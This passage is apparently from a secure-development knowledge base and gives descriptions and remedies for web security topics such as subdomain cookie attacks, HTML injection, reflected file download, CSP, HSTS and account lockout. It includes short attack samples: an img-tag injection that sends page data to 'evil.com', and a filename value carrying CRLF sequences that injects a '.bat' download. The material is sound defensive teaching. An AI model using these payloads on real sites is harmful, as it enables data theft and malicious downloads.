enforce the use of secure passwords?\n\n\n Solution:\n\nThe items as pointed out before should be looked into and taken into consideration\nwhenever you are letting users register on your system in order to enforce a\nhigh level of security.\n\nHere are the steps described briefly.\nFor more detailed information you should look into these items in the knowledge base.\n\nFirst, You enforce limits on the length of the users submits on the server side in order\nto prevent him from truncating his submits. These limits have to correlate with the limits\nyou set in your column in the database.\n\nSecond, you should create a single user input validation control class which should\nvalidate the expected input values in order to verify if the user is not tampering data\nor injecting malicious code into your application. All infringements should be logged\nand repercussions should be taken whenever these infringements are frequent.\n\nThird, never display the user\u2019s password on a screen anywhere.\n\nFourth, Whenever you generate a password for your users, this password should always\nbe randomized sufficiently.\n\nFifth, encrypt your passwords by proven cryptographic standards when storing them.\n\nSixth, Enforce secure passwords by implementing good password policies.\n"}, {"kb_id": 158, "title": "Cross subdomain cookie attack", "content": " Description:\n\nA quick overview of how it works:\n\n1. A website www.example.com hands out subdomains to untrusted third parties\n2. One such party, Mallory, who now controls evil.example.com, lures Alice to her site\n3. A visit to evil.example.com sets a session cookie with the domain .example.com on Alice''s browser\n4. When Alice visits www.example.com, this cookie will be sent with the request, as the specs for cookies states, and Alice will have the session specified by Mallory''s cookie.\n5. Mallory can now use Alice her account.\n\n Solution:\n\nIn this scenario changing the sessionID on login does not make any difference since\nAlice is already logged in when she visits Mallory''s evil web page.\n\nIt is good practice to use a completely different domain for all trusted activity.\n\nFor example Google uses google.com for trusted activities and *.googleusercontent.com\nfor untrusted sites.\n\nAlso when setting your cookies to specify which domains they are allowed to\nbe send to. Especially on your trusted domain you do not want to leak cookies to unintended\nsubdomains. highly recommended is to not use wildcards when setting this option.\n"}, {"kb_id": 159, "title": "HTML injections", "content": " Description:\n\nWhenever an attacker can inject HTML in your application there is a variety of different\nattacks he could perform such as:\n\n1. Content Spoofing\n2. Image Tag Injection \t\n3. Form Rerouting\n4. Base Jumping\n5. Element Override\n6. Hanging Textarea\n\nEven when your application intercepts XSS injections by means of a content security policy\nheader it still remains vulnerable to the attacks summarized above.\n\n Solution:\n\n1.Content spoofing Otherwise known as \"Content Injection\" or \"Virtual Defacement\" occurs whenever an attacker can inject code into your application. It is very important to sanitize and or encode user data before you display it on screen as HTML.\n\n2.Image tag injection occurs whenever an attacker injects a broken image tag with a nonterminated parameter like: \"img src=''http://evil.com?steal.php?value= Every content after value= parameter will now be stolen and send to evil.com by the attacker till the injection finds the next occurrence of a matching single quote.\nAgain you should sanitize and encode the user input to prevent an image tag from being injected in your application. For whenever a user is permitted to submit an image on your application enforce and verify the application accepts valid nonbroken tags only.\n\n3.The \"form\" tag can''t be nested. The toplevel occurrence of this element always takes precedence over subsequent appearances. Again you must avoid this type by properly encoding and sanitizing your userinputs.\n\n4.Whenever an attacker injects a \"base\" tag into your application it can steal data because the tag specifies the base URL/target to where to process the data to.\nThe solution to base jumping would be to use absolute paths in your application such as  action=''/update_profile.php''\ninstead of: action=''update_profile.php''\n\n5/6 can both also easily be prevented simply be encoding or sanitizing your userinput submitted towards your application.\nAlways validate your user input on a high level(serverside constraint). Whenever your application expects an integer you should validate and check whether the user submitted input really is what you expected it to be and otherwise, you terminate and log the request.\n\n"}, {"kb_id": 160, "title": "RFD and file download injections", "content": " Description:\n\nReflective file download occurs whenever an attacker can \"forge\" a download through misconfiguration in your \"disposition\" and \"content type\" headers. Instead of having the attacker to upload an evil file to the web server he can now force the browser to download a malicious file by abusing these headers and setting the file extension to any type he wants.\n\nNow, whenever there is also userinput being reflected back into that download it can be used to forge evil attacks. The attacker can present an evil file to ignorant victim''s who are trusting the domain of which the download was presented from.\n\nFile download injection is a similar type of attack except this attack is made possible whenever there is userinput that is reflected into the \"filename=\" parameter in the \"disposition\" header. The attacker again can force the browser to download a file with his own choice of extension and set the content of this file by injecting this directly into the response like filename=evil.bat%0A%0D%0A%0DinsertEvilStringHere\n\nWhenever the user now opens the downloaded file the attacker can gain full control over the target\u2019s device.\n\n\n Solution:\n\nFirst, never use user input directly into your headers since an attacker can now take control over it.\n\nSecondly, you should check if a filename really does exist before presenting it towards the users. You could also create a whitelist of all files which are allowed to be downloaded and terminate requests whenever they do not match.\n\nAlso, you should disable the use of \"path parameters\". It increases the attacker\u2019s attack vector and these parameters also cause a lot of other vulnerabilities.\nAnd last you should sanitize and encode all your userinput as much as possible. Reflective file downloads depend on userinput being reflected in the response header. Whenever this input has been sanitized and encoded it should not do any harm to any system it is being executed on\n\n"}, {"kb_id": 161, "title": "Identify all application components", "content": " Description:\n\nWhen you are building an application you first want to map where you are placing\nsource files, libraries and executables.\n\nWith these components identified and mapped, it becomes transparent where possible\npitfalls might be in your application and increases the maintainability of the\nsystem. Also, you have an indicator where possible reinforcements have to be\nimplemented to avoid attacks.(i.e places where your application contains executable''s)\n\n Solution:\n\nVerify that all application components (either individual or groups of source files,\nlibraries, and/or executables) that are present in the application are identified.\n\nWhen you identified these components you may want to map and document them in order to\nhave a quick reference to this infrastructure when needed.\n"}, {"kb_id": 162, "title": "Identify external dependencies", "content": " Description:\n\nSometimes your application has certain external dependencies which may strongly\ninfluence your application''s operation. These external dependencies\nmight become an attackers target since compromising that service might lead to\na DoS of your system or influence the system in such a way it leaves room for other\nattacks.\n\n Solution:\n\nFirst, you must identify which external dependencies your application relays on\nfor its operation. Second, there should be a failsafe implemented should this dependency ever\nfail to deliver its services towards your application.\n"}, {"kb_id": 163, "title": "High level architecture should be defined", "content": " Description:\n\nWhenever you are developing an application you want to map all the architecture it contains. Whenever there are breaches, updates, or other escalations it makes it easy and transparent for forensics, operators, and developers to do their job as fast as possible.\n\n Solution:\nVerify that a highlevel architecture for the application has been defined. This means some sort of a technical resign has to be composed of this architecture and all the elements it provides. This gives a visual representation of your application and makes it easier to work through.\n\nWhile you are mapping your application architecture you should also add all other components your application contains in terms of business functions and/or security functions they provide.\n\nWhen you map these components it becomes more transparent about different types of security mitigations that might be forgotten for some of your business functions. Because again, you now own a visual representation of this logic. Your application also becomes more manageable in terms of keeping up with the latest security updates and patches and gives you a better view of obsolete configurations, functions, and components which can be removed from the system.\n\nThis ofcourse also goed for all external components that your application depends on!\n\n"}, {"kb_id": 164, "title": "Threat modeling", "content": " Description:\n\nThreat modeling is a procedure for optimizing Network/ Application/ Internet Security by\nidentifying objectives and vulnerabilities, and then defining countermeasures to prevent,\nor mitigate the effects of, threats to the system. A threat is a potential or actual\nundesirable event that may be malicious (such as DoS attack) or incidental\n(failure of a Storage Device). Threat modeling is a planned activity for identifying and\nassessing application threats and vulnerabilities.\n\n Solution:\n\nThreat modeling is best applied continuously throughout a software development project.\nThe process is essentially the same at different levels of abstraction, although the\ninformation gets more and more granular throughout the lifecycle. Ideally, a highlevel\nthreat model should be defined in the concept or planning phase, and then refined\nthroughout the lifecycle. As more details are added to the system, new attack vectors are\ncreated and exposed. The ongoing threat modeling process should examine, diagnose, and\naddress these threats.\n\nNote that it is a natural part of refining a system for new threats to be exposed.\nFor example, when you select a particular technology  such as Java for example \nyou take on the responsibility to identify the new threats that are created by that choice.\nEven implementation choices such as using regular expressions for validation introduce\npotential new threats to deal with.\n\nMore indepth information about threat modeling can be found at:\nhttps://www.owasp.org/index.php/Application_Threat_Modeling\n"}, {"kb_id": 165, "title": "Differential analysis attack", "content": " Description:\n\nWhenever an attacker sends a request to the server, an example by means of\nauthentication functionality. He can measure the average response time between a request\ncontaining a valid username and a request containing a invalid username. The\nattacker can now use this differential in response time to enumerate user accounts.\n\n Solution:\n\nVerify that all authentication challenges, whether successful or failed, should respond\nin the same average response time. This same methodology applies for other sensitive information that could\npotentially be recovered with differential attacks.\n"}, {"kb_id": 166, "title": "Client side input validation", "content": " Description:\n\nAs web applications become more advanced, an increasing amount of HTML is generated by\nJavaScript on the clientside rather than by the server. Anytime content needs to be\nchanged without refreshing the entire page, the update must be performed using JavaScript.\nMost notably, this is the case when a page is updated after an AJAX request.\n\nXSS vulnerabilities can be present not only in your website''s serverside code, but also\nin your website''s clientside JavaScript code. Consequently, even with completely\nsecure serverside code, the clientside code might still unsafely include user input in a\nDOM update after the page has loaded. If this happens, the clientside code has enabled\nan XSS attack through no fault of the serverside code.\n\n Solution:\n\nFirst, there must be a client side input validation method as you would apply to the server\nside. This means you should also apply input rejection as well as typecasting and such.\nThis is to prevent users from being attacked by XSS attacks which are undetectable by\nthe server.\n\nRecommended knowledge base items:\n\n Positive validation method\n Single input validation controls\n Input rejection\n Input validation\n"}, {"kb_id": 167, "title": "Positive validation model", "content": " Description:\n\nThere are two popular methods for handling input validation. The first is blacklisting and the second one is the whitelisting method, also known as a positive validation model.\nThe big disadvantage of the blacklisting model would be that an attacker has a great diversity into forging his attack strings and payloads which can make it hard for your application to detect all of them. It would be very time consuming importing them all into your system.\nWhenever you are using a positive validation model you are simply checking for the input you were expecting as defined in your application\u2019s operation, for example:\n\nLet''s say you have a form and were expecting it to return the value of a checkbox. This would be a fixed value, yes or no? Whenever the value diverges from the expected input in the applications operation you can assume there was an intercepting proxy tampering these values and act accordingly to it. \nSame goes for whenever you were expecting just a string, integer, alphanumeric character or even special strings such as names as O\u2019Reily.\nThis method also makes your code clear, transparent and highly maintainable.\n\n Solution:\n\nFirst there must be a client side input validation method as you would apply to the server\nside. This means you should also apply input rejection as well as typecasting and such.\nThis is to prevent users from being attacked by XSS attacks which are undetectable by\nthe server.\n\n"}, {"kb_id": 168, "title": "TLS certificate public key pinning", "content": " Description:\n\nPinning is the process of associating a host with their expected X509 certificate or\npublic key. Once a certificate or public key is known or seen for a host, the certificate\nor public key is associated or ''pinned'' to the host. If more than one certificate or\npublic key is acceptable, then the program holds a pinset\n(taking from Jon Larimer and Kenny Root Google I/O talk). In this case, the advertised\nidentity must match one of the elements in the pinset.\n\n Solution:\n\nThe idea is to reuse the existing protocols and infrastructure, but use them in a\nhardened manner. For reuse, a program would keep doing the things it used to do when\nestablishing a secure connection.\n\nTo harden the channel, the program would take advantage of the OnConnect callback offered\nby a library, framework or platform. In the callback, the program would verify the\nremote host''s identity by validating its certificate or public key. While pinning does\nnot have to occur in an OnConnect callback, it is often most convenient because the\nunderlying connection information is readily available.\n\nFor more extended information on different types of implementation please see:\nhttps://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning\n"}, {"kb_id": 169, "title": "HSTS preload", "content": " Description:\n\nHTTP StrictTransportSecurity (HSTS) allows sites to specify that they should be accessed\nvia a secure connection only. The problem is, a user''s first request to a site employing\nHSTS may not be over HTTPS. A preload list will allow us to ship Firefox with some\npreset HSTS sites that, from the first time they''re accessed in the browser, will require\na secure connection.\n\n Solution:\n\nIn order to be included on the HSTS preload list, your site must:\n\n1. Have a valid certificate (which must expire before 2016 if it uses SHA1).\n2. Redirect all HTTP traffic to HTTPS\u2014i.e. be HTTPS only.\n3. Serve all subdomains over HTTPS, specifically including the www subdomain if a DNS\nrecord for that subdomain exists.\n4. Serve an HSTS header on the base domain:\n* Expiry must be at least eighteen weeks (10886400 seconds).\n* The includeSubdomains token must be specified.\n* The preload token must be specified.\n* If you are serving a redirect, that redirect must have the HSTS header, not the page it\n  redirects to.\n\nFor more details on HSTS, please see RFC 6797. Note that the preload flag in the HSTS\nheader is required to confirm and authenticate your submission to the preload list.\nAn example valid HSTS header:\n\n    StrictTransportSecurity: maxage=10886400; includeSubDomains; preload\n\nAdding your website to the list:\nhttps://www.chromium.org/hsts     \n\n\nSource:\nhttps://wiki.mozilla.org/Privacy/Features/HSTS_Preload_List\n"}, {"kb_id": 170, "title": "Forward secrecy ciphers", "content": " Description:\n\nIn cryptography, forward secrecy (FS; also known as perfect forward secrecy, or PFS) is a property of keyagreement protocols ensuring that a session key derived from a set of longterm keys cannot be compromised if one of the longterm keys is compromised in the future. The key used to protect the transmission of data must not be used to derive any additional keys, and if the key used to protect the transmission of data is derived from some other keying material, then that material must not be used to derive any more keys. In this way, compromise of a single key permits access only to data protected by that single key.\n\n Solution:\n\nIn the beginning SSL handshake, the client sends a list of supported cipher suites (among other things). The server then picks one of the cipher suites, based on a ranking, and tells the client which one they will be using.\n\nThis step is the one that determines whether or not the future connection will have perfect forward secrecy. Note that, at this point, certificates have not entered the picture at all. This is because whether or not a connection has perfect forward secrecy is determined by how the session key is derived. And how the session key is derived is determined by the cipher suite in use. So, the cipher suites that use ephemeral DiffieHellman (DHE) or the elliptic curve variant (ECDHE) will have perfect forward secrecy while the other options will not.\n"}, {"kb_id": 171, "title": "OCSP stapling", "content": " Description:\n\nOCSP stapling, formally known as the TLS Certificate Status Request extension, is an\nalternative approach to the Online Certificate Status Protocol (OCSP) for checking the\nrevocation status of X.509 digital certificates. It allows the presenter of a\ncertificate to bear the resource cost involved in providing OCSP responses by appending\n(\"stapling\") a timestamped OCSP response signed by the CA to the initial TLS Handshake,\neliminating the need for clients to contact the CA\n\n Solution:\n\nStapling basically means that the certificate holder queries the OCSP server themselves at\nregular intervals, obtaining a signed timestamped OCSP response. When the site''s visitors\nattempt to connect to the site, this response is included (\"stapled\") with the TLS/SSL\nHandshake via the Certificate Status Request extension response (note: the TLS client must\nexplicitly include a Certificate Status Request extension in its ClientHello TLS/SSL\nhandshake message). While it may appear that allowing the site operator to control\nverification responses would allow a fraudulent site to issue false verification for a\nrevoked certificate, the stapled responses can''t be forged as they need to be directly\nsigned by the certificate authority, not the server. If the client does not receive a\nstapled response, it will just contact the OCSP server by itself. However, if the\nclient receives an invalid stapled response, it will abort the connection. The only\nincreased risk of OCSP stapling is that the notification of revocation for a certificate\nmay be delayed until the lastsigned OCSP response expires.\n\nFor more detailed information about Specification, Deployment, and limitation visit:\nhttps://en.wikipedia.org/wiki/OCSP_stapling\n"}, {"kb_id": 172, "title": "STRIDE", "content": " Description:\n\nSTRIDE is a collective for a series of vulnerabilities your applications should\ncover in order to harden your applications security.\n\nSTRIDE stands for:\nSpoofing\nTampering\nRepudiation\nInformation Disclosure\nElevation of privilege\n\n Solution:\n\nThe STRIDE was initially created as part of the process of threat modelling. STRIDE is a model of threats, used to help reason and find threats to a system. It is used in conjunction with a model of the target system that can be constructed in parallel. This includes a full breakdown of processes, data stores, data flows and trust boundaries.\n\nToday it is often used by security experts to help answer the question \"what can go wrong in this system we''re working on?\"\n"}, {"kb_id": 173, "title": "File inclusion attack", "content": " Description:\n\nThe File Inclusion vulnerability allows an attacker to include a file, usually exploiting\na \"dynamic file inclusion\" mechanisms implemented in the target application.\nThe vulnerability occurs due to the use of usersupplied input without proper validation.\n\n\nThis can lead to something as outputting the contents of the file, but depending on the\nseverity, it can also lead to:\n\n Code execution on the web server\n Code execution on the clientside such as JavaScript which can lead to other attacks\n  such as crosssite scripting (XSS)\n Denial of Service (DoS)\n Sensitive Information Disclosure\n\n\nLocal File Inclusion (also known as LFI) is the process of including files, that are\nalready locally present on the server, through the exploiting of vulnerable inclusion\nprocedures implemented in the application. This vulnerability occurs, for example, when a\npage receives, as input, the path to the file that has to be included and this input is\nnot properly sanitized, allowing directory traversal characters (such as dotdotslash)\nto be injected. Although most examples point to vulnerable PHP scripts, we should keep\nin mind that it is also common in other technologies such as JSP, ASP and others.\n\n Solution:\n\nThe most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way, there is no attack surface for malicious users to manipulate the path.\n\nAlso, disable the opportunity for the application to load remote resources. This is mostly achieved by adding a server configuration file such as php.ini or web.xml\n\n\n"}, {"kb_id": 174, "title": "Access management", "content": " Description:\n\nWhenever your application contains administration and management functions you should\nput on restrictions for visiting these functionalities in order to reduce an attackers\nattack vector on your services since they are not directly accessible for them.\n\n Solution:\n\nVerify that access to administration and management functions within the Web Service\nApplication is limited to web service administrators.\n\nFor example, they could only be accessible from within a restricted source IP range.\n"}, {"kb_id": 175, "title": "XML schema (XSD)", "content": " Description:\n\nWhen adding schema''s to your or XML files you have better control over what type of userinput can be supplied in your application. This dramatically decreases an attacker\u2019s vector when implemented the right way. Nonetheless, you should always apply your own input validation and rejection as an extra layer of defense. This approach is also desirable since you also want to do countering and logging on the user\u2019s requests and input.\t \n\n Solution:\n\nVerify that XSD schema validation takes place to ensure a properly formed XML document, followed by validation of each input field before any processing of that data takes place.\n\n"}, {"kb_id": 176, "title": "Limiting user input size", "content": " Description:\n\nWhenever there is userinput supplied into your application you also want to limit\nthe size of the userinput to appropriate maximum lengths.\n\n Solution:\n\nVerify all the user input has been limited and the application only accepts expected input \nlengths\n"}, {"kb_id": 177, "title": "Parsing data  exchange formats", "content": " Description:\n\nWhenever you are parsing data exchange formats such as XML, JSON, CSV, etc, you\nhave to make sure that whenever these data files contain malicious code this will not be\nexecuted by your application. You should also not solely depend on your parser to do all\nthe encoding and escaping for you since there could always be an edge case that does\nexecute certain attacks.\n\n Solution:\n\nWe highly recommend doing your own escaping, sanitizing, encoding on all data before entering your application. The risk also depends on the context of wherever you are putting this data into. So before you are doing any mutations with your data after getting it from the resources, make sure you have applied the right mitigations.\n\nAlso, another reason to build an extra layer of escaping, sanitizing, encoding routines in your application is for the logging you want to apply on the data.\n\n\nRecommended knowledge base items:\n\n Input rejection\n Input validation\n Audit logs\n"}, {"kb_id": 178, "title": "Content security policy headers", "content": " Description:\n\nThe main use of the content security policy header is to, detect, report, and reject XSS attacks. The core issue in relation to XSS attacks is the browser''s inability to distinguish between a script that''s intended to be part of your application, and a script that''s been maliciously injected by a thirdparty.\nWith the use of CSP(Content Security policy), we can tell the browser which script is safe to execute and which scripts are most likely been injected by an attacker.\n\n Solution:\n\nA best practice for implementing CSP in your application would be to externalize all\nJavaScript within the web pages.\n\nSo this:\n    ```\n    <script>\n      function doSomething() {\n        alert(''Something!'');\n      }\n\t</script>\n\n\t<button onclick=''doSomething();''>foobar!</button>\n```\nMust become this:\n```\n\t<script src=''doSomething.js''></script>\n\t<button id=''somethingToDo''>Let''s foobar!</button>\n```\nThe header for this code could look something like:\n    ```\n    ContentSecurityPolicy: defaultsrc''self''; objectsrc''none''; scriptsrc''https://mycdn.com''\n    ```\nSince it is not entirely realistic to implement all JavaScript on external pages we can apply sort of a crosssite request forgery token to your inline JavaScript. This way the browser can again distinguish the difference between code which is part of the application against probable malicious injected code, in CSP this is called the ''nonce''. Of course, this method is also very applicable on your existing code and designs.\nNow, to use this nonce you have to supply your inline script tags with the nonce attribute. Firstly, it''s important that the nonce changes for each response. Otherwise, the nonce would become guessable. So it should also contain a high entropy and should be hard to predict. Similar to the operation of the CSRF tokens, the nonce becomes impossible for the attacker to predict making it difficult to execute a successful XSS attack.\n\n\nInline JavaScript example containing nonce:\n\t```\n\t<script nonce=sfsdf03nceI23wlsgle9h3sdd21>\n    <! Your javscript code >\n    </script>\n    ```\nMatching header example:\n    ```\n    ContentSecurityPolicy: scriptsrc ''noncesfsdf03nceI23wlsgle9h3sdd21''\n    ```\nThere is a whole lot more to learn about the CSP header for indepth implementation in your application. This knowledge base item just scratches the surface and it would be highly recommended to gain more indepth knowledge about this powerful header\n\n Very Important:\nWhen applying the CSP header, although it blocks XSS attacks. Your\napplication still remains vulnerable to HTML and other code injections.\nSo this is not a substitute for, validation, sanitizing and encoding of userinput.\n"}, {"kb_id": 179, "title": "Safe javascript jquery methods", "content": " Description:\n\nWhenever you are supplying your JavaScript/jquery with data which is controlled by the\nuser, you should make sure this data is not supplied towards functions which could\ninterpreted the supplied and parse input as code. This could lead to XSS and other code\ninjections.\n\n Solution:\n\nBelow we listed some safe functions for whenever it is needed to supply your\nJavaScript/jquery functions with userinput.\n\nJQUERY functions:\n.txt();\n.val();\n.parse();\n\nExample:\n      ````\n\t<script>\n\tfunction myFunction() {\n\t\t$( \"p\" ).text( \"append userinput to paragrapgh safely\" );\n\t}\n\t</script>\n\n\n\tJavscript functions:\n\t.innerText();   < not supported by firefox\n\t.textContext(); < not supported on I.E 8 and lower\n\t.createTextNode();\n\t.value();\n\t```\n\t\nExample:\n\t```\n\t<script>\n\tfunction myFunction() {\n   \t\tvar t = document.createTextNode(\"append userinput to body safely\");\n    \tdocument.body.appendChild(t);\n\t}\n\t</script>\n\t```\n"}, {"kb_id": 180, "title": "WYSIWYG editors", "content": " Description:\n\nWYSIWYG editors can be a great risk to your web application since it allows direct\nHTML as input to make the user perform styling on their submissions. This is why the\neditor should be put under a strict sanitation protocol to prevent injections.\n\nThe first thing to take into consideration whenever you want to use WYSIWYG editors on\nyour web application is to use as limited options as possible. Only the options which\nare necessary for your applications intended operation should be applied. This decreases\nthe attackers attack vector drastically and leaves less room for error in your WYSIWYG\neditor in terms of your HTML sanitation.\n\nWhen providing your web application with an WYSIWYG editor you should also take note that\nmost people just want to use bullets, make text bold or underline some text. They mostly\ndo not understand half the functionalities the editors are providing.\n\n Solution:\n\nDownload a HTML sanitizer and configure it to your specific needs. When configuring the sanitizer make sure\nyou disable all unused components. The less options an attacker has to insert into your application the less\nhis attack surface becomes. Also before implementing this HTML sanitizer on a production environment have\nit first thoroughly examined by security testers since it is a very delicate function.\n"}, {"kb_id": 181, "title": "Parsing JSON with Javascript", "content": " Description:\n\nThe eval() function evaluates or executes an argument.\n\nIf the argument is an expression, eval() evaluates the expression. If the argument is one\nor more JavaScript statements, eval() executes the statements.\n\nThis is exactly the reason why eval() should NEVER be used to parse JSON or other\nformats of data which could possible contain malicious code.\n\n Solution:\n\nFor the purpose of parsing JSON we would recommend the use of the json.parse functionality.\nEven though this function is more trusted you should always build your own security checks\nand encoding routines around the json.parse before mutating the data or passing it on to\na view to be displayed in your HTML.\n"}, {"kb_id": 182, "title": "Account lockout", "content": " Description:\n\nAll applications should contain the possibility to lock down accounts for whenever it\ndetects attacks by/on users. Also you should include options for both soft and hard\nlockout mechanisms.\n\n Solution:\n\nSoft lockout:\nThis can be a good option for protecting your users against brute force attacks.\nFor example, whenever the user enters a wrong password three times, the application could\nlock down the account for a minute in order to slow down the process of brute forcing his\npassword making it less profitable for the attacker to proceed. If u were to implement\nhard lockout countermeasures for this example you would achieve a \"Dos\" by permanently\nlocking out accounts.\n\nHard lockout:\nThis type of lockout should be applied whenever you detect a user attacking your\napplication and counter him by means of permanently locking out his account until a\nresponse team had time to do their forensics. After this process you can decide to\ngive the user back his account or take further legal actions against him.\nThis type of approach prevents the attacker from further penetrating your application\nand infrastructure.\n\nNote: \nBe cautious that a softlockout countermeasure does not override a hardlockout status.\n\n\n"}, {"kb_id": 183, "title": "XML attacks", "content": " Description:\n\nWhenever you are using XML in your application there are a few possibilities for\ninjections depending on how you are applying XML in your system.\n\nExtensible Markup Language (XML) is a markup language that defines a set of rules for\nencoding documents in a format which is both humanreadable and machinereadable. It is\ndefined by the W3C''s XML 1.0 Specification and by several other related specifications,\nall of which are free open standards.\n\n Solution:\n\nItems listed below are recommended to read whenever you are planning to use XML in your\napplication.\n\nRecommended knowledge base items:\n\n XML injection\n External DTD parsing\n XSLT injections\n XPath injections\n XXE injections\n"}, {"kb_id": 184, "title": "Centralized security controls", "content": " Description:\n\nWhenever security controls do not have a centralized implementation there is a high\nprobability for bugs or security issues being hidden into your application due to the loss\nof abstraction and duplication.\n\n Solution:\n\nMake sure all your different type of security controls have a centralized place of implementation.\nAlso verify that error handling logic in security controls denies access by default.\n"}, {"kb_id": 185, "title": "Data controller display layer separation", "content": " Description:\n\nThe application should separate data, controller, and display layers in order to make your\napplication more clear and understandable in terms of abstraction due to separation.\n\nWhenever your application is more organized and abstracted it is much easier to implement\nless flawed security controls.\n\n Solution:\n\nMake sure your different type of data layers are separated in your application.\n\nThe separation of these different layers is also know as a design pattern which goes\nby the name MVC (model, view, controller).\n"}, {"kb_id": 186, "title": "Proven authentication mechanisms", "content": " Description:\n\nWhenever your application has the option for users to authenticate themselves\nyour method should be \"proven\" and secure in the sense of that:\n\n1. it should comply to some security standards/guidelines\n2. Before implementing authentication on a live environment it has to be pentested/audited by\n   professionals.\n\n Solution:\n\nVerify authentication mechanisms in the application are proven and verified against\nASVS.\n"}, {"kb_id": 187, "title": "Administrative interfaces must not be accessible to untrusted parties", "content": " Description:\n\nWhenever it is not necessary for administrative pages to be publicly accessible these\npages should have restricted access for users. Whenever these pages are secluded from the rest\nof the application in terms of accessibility this could reduce the attack vector of malicious users.\n\n Solution:\n\nThe first solution is to grant access only from a certain source IP range to the\nadministrative interface. If that solution would not be possible then it is always recommended\nto enforce a stepup or adaptive authentication for logging in into the administrative interface.\n\nRecommended knowledgebase item:\n\n Step up or adaptive authentication\n"}, {"kb_id": 188, "title": "Concurrent session handling", "content": " Description:\n\nYou should keep track of all the different active concurrent sessions.\nWhenever the application discovers concurrent sessions it should always notify the user\nabout this and should give him the opportunity to end the other sessions.\n\nWith this defense in place it becomes harder for attackers to hijack a users session since\nthey will be notified about concurrent sessions.\n\n Solution:\n\nThe application should keep track and limit all the granted sessions.\nIt should store your users IP address, session id and user id. After storing these credentials\nit should do regular checks to see if there are:\n\n1. Multiple active sessions linked to same user id\n2. Multiple active sessions from different locations\n3. Multiple active sessions from different devices\n4. Limit and destroy sessions when they exceed an accepted threshold.\n\nThe more critical the application becomes, the lower the accepted threshold for\nconcurrent sessions should be.\n\n\n"}, {"kb_id": 189, "title": "Auto escaping technology", "content": " Description:\n\nSome frameworks/templates have the option to autoescape all incoming userinput to harmless\nencoded data in order to prevent attacks. However, this autoescaping functionality is also\noptional to be disabled. Whenever this autoescaping function has been disabled your application\nmight be vulnerable to attacks like XSS.\n\n Solution:\n\nWhenever autoescaping functionality in your application has been disabled for whatever reason, you\nshould make sure there is other protection in place like a HTML sanitizer in order to\nprevent attackers from injecting malicious code into your application.\n"}, {"kb_id": 190, "title": "Client side storage", "content": " Description:\n\nClient side storage also known as Offline Storage or Web Storage. The Underlying storage mechanism may vary from one\nuser agent to the next. In other words, any authentication your application requires can\nbe bypassed by a user with local privileges to the machine on which the data is stored.\nTherefore, it''s recommended not to store any sensitive information in local storage.\n\n Solution:\n\nVerify that authenticated data is cleared from client storage, such as the browser DOM, after the\nsession is terminated. This also goes for other session and local storage information which could\nassist an attacker launching an successful attack.\n\nVerify that data stored in client side storage (such as HTML5 local storage, session storage, IndexedDB, regular\ncookies or Flash cookies) does not contain sensitive data or PII (personal identifiable information).\n\n\n"}, {"kb_id": 191, "title": "Log rotation and seperation", "content": " Description:\n\nLog separation is indispensable in order to prevent it from either radically downgrading your\napplication its performance or even causing a Denial of service because the server becomes\nunavailable due to the flooding of logs.\n\n Solution:\n\nLog rotation is an automated process used in system administration in which dated log\nfiles are archived. Servers which run large applications, such as LAMP stacks, often\nlog every request: in the face of bulky logs, log rotation is a way to limit the total\nsize of the logs while still allowing analysis of recent events.\n\nLog separation basically means that you have to store your log files on a different partition\nas where your OS/application is running on in order to avert a Denial of service attack or the downgrading\nof your application its performance.\n"}, {"kb_id": 192, "title": "HTTP strict transport security", "content": " Description:\n\nHTTP Strict Transport Security (HSTS) is an optin security enhancement that is specified\nby a web application through the use of a special response header. Once a supported browser\nreceives this header that browser will prevent any communications from being sent over\nHTTP to the specified domain and will instead send all communications over HTTPS. It also\nprevents HTTPS click through prompts on browsers. \n\nHSTS addresses the following threats:\n\n1. User bookmarks or manually types http://example.com and is subject to a maninthemiddle attacker\n   HSTS automatically redirects HTTP requests to HTTPS for the target domain\n2. Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP\n   HSTS automatically redirects HTTP requests to HTTPS for the target domain\n3. A maninthemiddle attacker attempts to intercept traffic from a victim user using an invalid certificate and \n   hopes the user will accept the bad certificate\n4. HSTS does not allow a user to override the invalid certificate message\n\n Solution:\n\nWhen users are visiting the application it should set the following header:\nThese headers should be set in a base class which always sets the header no mather what\npage the users initially visit.\n\nSimple example, using a long (1 year) maxage:\n    StrictTransportSecurity: maxage=31536000\n\nIf all present and future subdomains will be HTTPS:\n    StrictTransportSecurity: maxage=31536000; includeSubDomains\n\n CAUTION: \nSite owners can use HSTS to identify users without cookies. This can lead to a significant\nprivacy leak.\n\nCookies can be manipulated from subdomains, so omitting the include \"includeSubDomains\"\noption permits a broad range of cookierelated attacks that HSTS would otherwise prevent\nby requiring a valid certificate for a subdomain. Ensuring the \"Secure Flag\" is set on all\ncookies will also prevent, some, but not all, of the same attacks.\n\n"}, {"kb_id": 193, "title": "API responses security headers", "content": " Description:\n\nThere are some security headers which should be properly configured in order to protect some API callbacks against Reflective File Download and other type of injections.\n\nAlso check if the API response is dynamic, if user input is reflected in the response. If so, you must validate and encode the input, in order to prevent XSS and Same origin method execution attacks.\n\n Solution:\n\nSanitize your API''s input (in this case they should just allow alphanumeric); escaping is not sufficient\n\nVerify that all API responses contain XContentTypeOptions: nosniff, to prevent the browser from interpreting files as something else than declared by the content type (this helps prevent XSS if the page is interpreted as html or js).\n\nAdd ''ContentDisposition: attachment; filename=\"filename.extension\"'' with extension corresponding the file extension and contenttype, on APIs that are not going to be rendered\n\n"}, {"kb_id": 194, "title": "Do not support untrusted client side technologies", "content": " Description:\n\nWhen using unsupported client side technologies which are not supported natively via\nW3C browser standards. Your application could be open to different types of attacks.\n\n Solution:\n\nDo not use Flash, ActiveX, Silverlight, NACL, clientside Java or other client side technologies\nnot supported natively via W3C browser standards.\n"}, {"kb_id": 195, "title": "Signed message payloads WS security", "content": " Description:\n\nIn order to establish trust between two communicating party''s such as servers and clients\nthere message payload should be signed by means of public/private key method. This builds trust\nand makes it harder for attackers to impersonate different users.\n\nWeb Services Security (WSSecurity, WSS) is an extension to SOAP to apply security to \nWeb services. It is a member of the Web service specifications and was published by OASIS.\n\nThe protocol specifies how integrity and confidentiality can be enforced on messages and allows \nthe communication of various security token formats, such as Security Assertion Markup Language (SAML), \nKerberos, and X.509. Its main focus is the use of XML Signature and XML Encryption to provide endtoend security.\n\n Solution:\n\nWSSecurity 